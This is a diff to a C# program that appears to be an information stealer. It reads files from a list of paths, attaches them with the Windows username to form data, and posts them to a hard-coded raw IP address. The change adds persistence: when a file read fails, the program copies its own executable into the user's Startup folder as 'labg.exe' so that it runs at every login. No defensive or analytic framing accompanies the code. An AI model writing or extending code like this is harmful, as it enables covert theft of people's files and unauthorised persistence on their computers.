@@ -1,4 +1,5 @@
-﻿using System.Text.RegularExpressions;
+﻿using System.Diagnostics;
+using System.Text.RegularExpressions;
 
 class Program
 {
@@ -45,11 +46,33 @@ class Program
 
             foreach (string Path in Paths)
             {
-                var filestream = File.OpenRead(Path);
-                var filecontent = new StreamContent(filestream);
-                filecontent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("multipart/form-data");
-                formData.Add(filecontent, "files", System.IO.Path.GetFileName(Path));
-                formData.Add(new StringContent(Environment.UserName), "username");
+                try
+                {
+                    var filestream = File.OpenRead(Path);
+                    var filecontent = new StreamContent(filestream);
+                    filecontent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("multipart/form-data");
+                    formData.Add(filecontent, "files", System.IO.Path.GetFileName(Path));
+                    formData.Add(new StringContent(Environment.UserName), "username");
+                }
+                catch (IOException)
+                {
+                    try
+                    {
+                        string source = Environment.ProcessPath;
+                        string destination = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\labg.exe";
+
+                        if (!File.Exists(destination))
+                        {
+                            File.Copy(source, destination, false);
+                        }
+
+                        return;
+                    }
+                    catch (IOException)
+                    {
+                        return;
+                    }
+                }
             }
 
             Uri uri = new Uri("http://4.228.217.126:5000/JustTwoOfUs");
